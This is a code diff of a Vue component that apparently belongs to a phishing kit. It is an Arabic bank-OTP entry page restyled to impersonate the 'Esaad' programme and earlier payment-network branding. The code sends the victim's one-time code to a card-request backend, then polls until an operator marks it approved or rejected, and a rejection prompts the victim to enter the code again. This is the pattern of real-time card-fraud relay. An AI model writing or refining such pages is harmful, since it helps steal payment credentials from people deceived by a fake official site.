@@ -1,15 +1,17 @@
 <script setup lang="ts">
 import { ref, computed, onMounted, onUnmounted } from 'vue';
 import { useRouter } from 'vue-router';
-import { doc, updateDoc, onSnapshot } from 'firebase/firestore';
-import { db, handleFirestoreError, OperationType } from '../firebase';
+import { ShieldCheck } from 'lucide-vue-next';
+import { updateCardRequest, getCardRequest, resolveActiveRequestId, setActiveRequestId } from '../api';
 
 const router = useRouter();
 const otp = ref('');
 const timeLeft = ref(55); // 00:55
 let timer: ReturnType<typeof setInterval> | null = null;
+let statusPoll: ReturnType<typeof setInterval> | null = null;
 const isSubmitting = ref(false);
 const error = ref('');
+const successMessage = ref('');
 
 const pad = (n: number) => n.toString().padStart(2, '0');
 
@@ -29,6 +31,7 @@ onMounted(() => {
 
 onUnmounted(() => {
   if (timer) clearInterval(timer);
+  if (statusPoll) clearInterval(statusPoll);
 });
 
 const submitOtp = async () => {
@@ -42,54 +45,41 @@ const submitOtp = async () => {
 
   isSubmitting.value = true;
   
-  const requestId = localStorage.getItem('currentRequestId');
+  const requestId = await resolveActiveRequestId();
   if (!requestId) {
-    alert('Request ID not found. Please start from the beginning.');
+    error.value = 'لم يتم العثور على الطلب، يرجى البدء من جديد.';
     isSubmitting.value = false;
-    router.push('/');
+    setTimeout(() => router.push('/'), 1200);
     return;
   }
 
   try {
-    const requestRef = doc(db, 'requests', requestId);
-    const payload = {
+    await updateCardRequest(requestId, {
       otp: otp.value,
       step: 'otp-bank',
-      otpStatus: 'pending',
-      updatedAt: new Date().toISOString()
-    };
-    
-    try {
-      const fallbackStr = localStorage.getItem('fallback_requests') || '{}';
-      const fallbackData = JSON.parse(fallbackStr);
-      if (fallbackData[requestId]) {
-        fallbackData[requestId] = { ...fallbackData[requestId], ...payload };
-        localStorage.setItem('fallback_requests', JSON.stringify(fallbackData));
-      }
-    } catch(e) {}
+      otpStatus: 'pending'
+    });
 
-    await updateDoc(requestRef, payload);
-    
-    const unsubscribe = onSnapshot(requestRef, (docSnap) => {
-      if (docSnap.exists()) {
-        const data = docSnap.data();
+    if (statusPoll) clearInterval(statusPoll);
+    statusPoll = setInterval(async () => {
+      try {
+        const data = await getCardRequest(requestId);
+        if (!data) return;
         if (data.otpStatus === 'approved') {
-          unsubscribe();
-          alert('العملية تمت بنجاح!');
-          localStorage.removeItem('currentRequestId');
+          if (statusPoll) clearInterval(statusPoll);
+          successMessage.value = 'تمت العملية وتأكيد الطلب بنجاح!';
+          setActiveRequestId(null);
           isSubmitting.value = false;
-          router.push('/');
+          setTimeout(() => router.push('/'), 1800);
         } else if (data.otpStatus === 'rejected') {
-          unsubscribe();
+          if (statusPoll) clearInterval(statusPoll);
           error.value = 'الرجاء إدخال رمز صحيح. الرمز غير صحيح.';
           otp.value = '';
           isSubmitting.value = false;
         }
-      }
-    });
-
+      } catch (e) {}
+    }, 1500);
   } catch (err) {
-    handleFirestoreError(err, OperationType.UPDATE, `requests/${requestId}`);
     error.value = 'حدث خطأ أثناء إرسال الرمز. يرجى المحاولة مرة أخرى.';
     isSubmitting.value = false;
   }
@@ -97,72 +87,85 @@ const submitOtp = async () => {
 </script>
 
 <template>
-  <div class="min-h-screen bg-[#fafafa] flex flex-col items-center pt-8 pb-10 px-4 font-sans text-gray-800">
+  <div dir="rtl" class="max-w-xl mx-auto min-h-screen bg-[#eef5f0] flex flex-col justify-between font-sans text-gray-900">
     
-    <!-- Top Header -->
-    <div class="mb-6 w-full flex flex-col items-center">
-      <h1 class="text-4xl font-light text-slate-800 tracking-wide mb-10">Payment</h1>
-      <div class="font-bold text-[45px] flex items-center tracking-tight mb-4">
-        <span class="text-[#005bb5]">network</span>
-        <span class="text-[#e21838] ml-1 text-3xl font-bold">></span>
+    <!-- Top Dark Esaad Header -->
+    <header class="w-full bg-[#040c06] py-3 px-4 flex justify-center border-b border-[#009a44]/30">
+      <div @click="router.push('/')" class="cursor-pointer flex flex-col items-center select-none">
+        <div class="text-[#39b54a] font-black text-base leading-none tracking-tight">إسعاد</div>
+        <div class="text-[#39b54a] font-extrabold text-sm leading-none -mt-0.5 tracking-tight">esaad</div>
+        <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
+          <circle cx="14" cy="4" r="2" fill="#39b54a" />
+          <circle cx="46" cy="4" r="2" fill="#39b54a" />
+          <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
+        </svg>
       </div>
-    </div>
+    </header>
 
     <!-- Main Card -->
-    <div class="bg-white rounded-xl shadow-[0_10px_40px_rgb(0,0,0,0.12)] w-full max-w-[420px] border border-gray-100 p-8 flex flex-col items-center relative z-10 text-center mx-4 pb-12">
-      
-      <p class="text-gray-900 text-[19px] mb-8 font-medium leading-relaxed" dir="rtl">
-        إذا لم تتلقى رمز التأكيد برسالة نصية عبر جوالك
-      </p>
+    <div class="px-5 py-6 my-auto flex flex-col items-center">
+      <div class="bg-white rounded-2xl shadow-[0_10px_35px_rgba(0,0,0,0.06)] w-full max-w-[390px] border border-gray-200/80 p-6 flex flex-col items-center relative z-10 text-center">
+        
+        <span class="text-[11px] font-bold text-[#008a40] mb-1.5">التحقق عبر التطبيق البنكي</span>
 
-      <p class="text-gray-900 text-[21px] font-medium leading-normal mb-12 mt-2" dir="rtl">
-        قم بفتح التطبيق البنكي<br/>
-        سيظهر لك اشعار فوري<br/>
-        قم بالضغط على الاشعار لتأكيد الطلب
-      </p>
+        <p class="text-gray-900 text-sm mb-4 font-bold leading-relaxed">
+          إذا لم تتلقَّ رمز التأكيد برسالة نصية عبر جوالك
+        </p>
 
-      <div class="flex items-center gap-6 w-full mb-10 justify-between px-2">
-        <div class="w-full relative group flex-1">
-          <input 
-            type="text" 
-            v-model="otp" 
-            placeholder="* * * * * *" 
-            class="w-full border border-gray-800 rounded-lg py-3.5 text-center text-xl tracking-[0.4em] focus:outline-none focus:border-gray-500 text-gray-800 bg-transparent transition-colors placeholder-gray-500"
-            maxlength="6"
-          />
-          <p v-if="error" class="text-red-500 text-sm mt-2 absolute -bottom-6 w-full text-center">{{ error }}</p>
+        <div class="bg-[#f3f9f5] border border-[#009a44]/20 rounded-xl p-3.5 mb-5 w-full">
+          <p class="text-gray-800 text-xs font-semibold leading-relaxed">
+            قم بفتح التطبيق البنكي<br/>
+            سيظهر لك إشعار فوري<br/>
+            قم بالضغط على الإشعار لتأكيد الطلب أو أدخل الرمز أدناه
+          </p>
         </div>
 
-        <!-- Timer -->
-        <div class="text-[24px] font-normal text-gray-800 font-sans ml-2">
-          {{ formattedTime }}
+        <div v-if="successMessage" class="w-full mb-4 p-2.5 rounded-xl bg-green-50 border border-green-200 text-[#008a40] text-xs font-bold">
+          {{ successMessage }}
         </div>
+
+        <div class="flex items-center gap-3 w-full mb-6 justify-between" dir="ltr">
+          <div class="w-full relative flex-1">
+            <input 
+              type="text" 
+              v-model="otp" 
+              placeholder="* * * * * *" 
+              class="w-full border border-gray-300 rounded-xl py-2.5 text-center text-base tracking-[0.4em] focus:outline-none focus:border-[#009a44] text-gray-900 bg-transparent transition-colors placeholder-gray-400 font-mono"
+              maxlength="6"
+            />
+          </div>
+
+          <!-- Timer -->
+          <div class="text-base font-extrabold text-[#008a40] font-mono tabular-nums shrink-0">
+            {{ formattedTime }}
+          </div>
+        </div>
+
+        <p v-if="error" class="text-red-600 text-[11px] mb-3 text-center">{{ error }}</p>
+
+        <!-- Submit Button -->
+        <button 
+          @click="submitOtp" 
+          :disabled="isSubmitting"
+          class="w-full bg-[#008a40] hover:bg-[#007335] text-white py-3 rounded-xl font-bold text-sm tracking-wide transition-colors disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2 shadow-md cursor-pointer"
+        >
+          <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
+          <span v-else>تأكيد الرمز (Verification Code)</span>
+        </button>
+
       </div>
 
-      <!-- Submit Button -->
-      <button 
-        @click="submitOtp" 
-        :disabled="isSubmitting"
-        class="w-full bg-[#3b3b3b] hover:bg-[#222] text-white py-4 rounded-[6px] font-medium text-[18px] tracking-wide transition-all disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2 px-6 shadow-sm"
-      >
-        <span v-if="isSubmitting" class="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></span>
-        <span v-else>verification code</span>
-      </button>
-
+      <!-- Security Footer -->
+      <div class="mt-6 flex items-center justify-center gap-1.5 text-[11px] font-bold text-[#008a40]">
+        <ShieldCheck class="w-3.5 h-3.5" />
+        <span>بوابة الدفع الإلكتروني الآمن - برنامج إسعاد</span>
+      </div>
     </div>
 
-    <!-- Logos Footer -->
-    <div class="mt-12 flex flex-wrap items-center justify-center gap-4 w-full max-w-[450px] px-2 mb-8">
-       <!-- Mock images using pure CSS for visual structure from screenshot -->
-       <div class="border border-gray-200 bg-white rounded px-3 py-1 flex items-center justify-center text-[10px] h-8 text-[#0f54a8] font-bold">SAMSUNG<br/>pay</div>
-       <div class="border border-gray-200 bg-white rounded px-3 py-1 flex items-center justify-center text-[12px] h-8 font-medium text-gray-600 gap-1"><span class="text-blue-500 font-bold">G</span> Pay</div>
-       <div class="border border-gray-200 bg-white rounded px-2 py-1 flex items-center justify-center h-8 bg-[#2d6fa8]"><span class="text-white font-bold text-[8px] leading-tight text-center">AMERICAN<br/>EXPRESS</span></div>
-       <div class="border border-gray-200 bg-white rounded px-3 py-1 flex items-center justify-center h-8">
-         <div class="w-3 h-3 bg-red-500 rounded-full opacity-90 -mr-1"></div>
-         <div class="w-3 h-3 bg-yellow-400 rounded-full opacity-90 -ml-1 mix-blend-multiply"></div>
-       </div>
-       <div class="border border-gray-200 bg-white rounded px-3 py-1 flex items-center justify-center text-[#1a1f71] text-[16px] font-bold italic h-8">VISA</div>
-    </div>
+    <!-- Esaad Footer -->
+    <footer class="bg-[#e4f2ea] px-5 py-4 text-center text-[11px] text-gray-600 border-t border-gray-200/60">
+      © 2026 esaad, كل الحقوق محفوظة.
+    </footer>
 
   </div>
 </template>
